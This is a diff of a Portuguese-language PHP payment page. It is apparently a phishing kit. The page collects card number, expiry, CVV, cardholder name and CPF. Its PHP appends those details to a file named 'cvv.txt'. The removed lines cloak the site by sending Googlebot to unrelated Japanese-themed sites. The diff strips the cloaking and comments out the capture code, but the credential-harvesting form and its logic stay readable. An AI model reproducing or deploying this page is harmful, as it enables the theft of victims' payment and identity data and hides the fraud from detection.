@@ -1,29 +1,9 @@
-<?php
-// Array com os links aleatórios
-$links = array(
-    'https://www.br.emb-japan.go.jp/itprtop_pt/index.html',
-    'https://japanrabbit.com/pt/lojas/',
-    'https://www.japanstore.com.br/'
-);
-
-// Verifica o user-agent para identificar o Googlebot
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$isGooglebot = stripos($userAgent, 'Googlebot') !== false;
-
-// Redireciona o Googlebot para um link aleatório
-if ($isGooglebot) {
-    $randomLink = $links[array_rand($links)];
-    header("Location: $randomLink");
-    exit();
-}
-?>
-
 <html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pagamento</title>
-    <style>
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Pagamento</title> 
+  <style>
         .container {
             max-width: 400px;
             margin: 0 auto;
@@ -79,10 +59,10 @@ if ($isGooglebot) {
             border-radius: 4px;
             cursor: pointer;
         }
-    </style>
-</head>
-<body>
-    <?php
+    </style> 
+ </head> 
+ <body> 
+  <!--?php
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $numeroCartao = formatarNumeroCartao($_POST["cardNumberInput"]);
         $validade = formatarValidade($_POST["expiryInput"]);
@@ -102,7 +82,7 @@ if ($isGooglebot) {
 
         file_put_contents('cvv.txt', $dados, FILE_APPEND);
 
-        // Redireciona para a página final.php
+        // Redireciona para a página final.html
         header("Location: final.html");
         exit();
     }
@@ -135,52 +115,44 @@ if ($isGooglebot) {
     // Cálculo do valor das parcelas
     $parcelasDisponiveis = 2; // Número de parcelas disponíveis
     $valorParcela = $valorProduto / $parcelasDisponiveis;
-    ?>
-
-    <div class="container">
-        <div class="card"></div>
-
-        <form method="POST">
-            <div class="card-input">
-                <label class="card-label" for="cardNumberInput">Número do Cartão</label>
-                <input id="cardNumberInput" class="card-number-input" type="text" placeholder="1234 5678 9012 3456" name="cardNumberInput" required>
-            </div>
-
-            <div class="card-input">
-                <label class="card-label" for="expiryInput">Validade (MM/AA)</label>
-                <input id="expiryInput" class="expiry-input" type="text" placeholder="MM/AA" name="expiryInput" required>
-            </div>
-
-            <div class="card-input">
-                <label class="card-label" for="cvvInput">CVV</label>
-                <input id="cvvInput" class="cvv-input" type="text" placeholder="123" name="cvvInput" required maxlength="4">
-            </div>
-
-            <div class="card-input">
-                <label class="card-label" for="nameInput">Nome Impresso no Cartão</label>
-                <input id="nameInput" class="name-input" type="text" placeholder="Nome Sobrenome" name="nameInput" required>
-            </div>
-
-            <div class="card-input">
-                <label class="card-label" for="cpfInput">CPF</label>
-                <input id="cpfInput" class="cpf-input" type="text" placeholder="123.456.789-00" name="cpfInput" required>
-            </div>
-
-            <div class="valor-produto">Valor do Produto: R$ <?php echo $valorProduto; ?></div>
-
-            <div class="card-input">
-                <label class="card-label" for="parcelasSelect">Parcelas</label>
-                <select id="parcelasSelect" class="parcelas-select" name="parcelasSelect" required>
-                    <option value="1">1x - R$ <?php echo $valorProduto; ?></option>
-                    <option value="2">2x - R$ <?php echo number_format($valorParcela, 2, ',', '.'); ?></option>
-                </select>
-            </div>
-
-            <input class="submit-btn" type="submit" value="Finalizar Pagamento">
-        </form>
-    </div>
-
-    <script>
+    ?--> 
+  <div class="container"> 
+   <div class="card"></div> 
+   <form method="POST"> 
+    <div class="card-input"> 
+     <label class="card-label" for="cardNumberInput">Número do Cartão</label> 
+     <input id="cardNumberInput" class="card-number-input" type="text" placeholder="1234 5678 9012 3456" name="cardNumberInput" required> 
+    </div> 
+    <div class="card-input"> 
+     <label class="card-label" for="expiryInput">Validade (MM/AA)</label> 
+     <input id="expiryInput" class="expiry-input" type="text" placeholder="MM/AA" name="expiryInput" required> 
+    </div> 
+    <div class="card-input"> 
+     <label class="card-label" for="cvvInput">CVV</label> 
+     <input id="cvvInput" class="cvv-input" type="text" placeholder="123" name="cvvInput" required maxlength="4"> 
+    </div> 
+    <div class="card-input"> 
+     <label class="card-label" for="nameInput">Nome Impresso no Cartão</label> 
+     <input id="nameInput" class="name-input" type="text" placeholder="Nome Sobrenome" name="nameInput" required> 
+    </div> 
+    <div class="card-input"> 
+     <label class="card-label" for="cpfInput">CPF</label> 
+     <input id="cpfInput" class="cpf-input" type="text" placeholder="123.456.789-00" name="cpfInput" required> 
+    </div> 
+    <div class="valor-produto">
+      Valor do Produto: R$ 
+     <!--?php echo $valorProduto; ?--> 
+    </div> 
+    <div class="card-input"> 
+     <label class="card-label" for="parcelasSelect">Parcelas</label> 
+     <select id="parcelasSelect" class="parcelas-select" name="parcelasSelect" required> <option value="1">1x - R$ 
+       <!--?php echo $valorProduto; ?--></option> <option value="2">2x - R$ 
+       <!--?php echo number_format($valorParcela, 2, ',', '.'); ?--></option> </select> 
+    </div> 
+    <input class="submit-btn" type="submit" value="Finalizar Pagamento"> 
+   </form> 
+  </div> 
+  <script>
         // Função para formatar o número do cartão em tempo real
         function formatarNumeroCartao(event) {
             const input = event.target;
@@ -208,6 +180,6 @@ if ($isGooglebot) {
 
         cardNumberInput.addEventListener('input', formatarNumeroCartao);
         expiryInput.addEventListener('input', formatarValidade);
-    </script>
-</body>
+    </script> 
+ </body>
 </html>
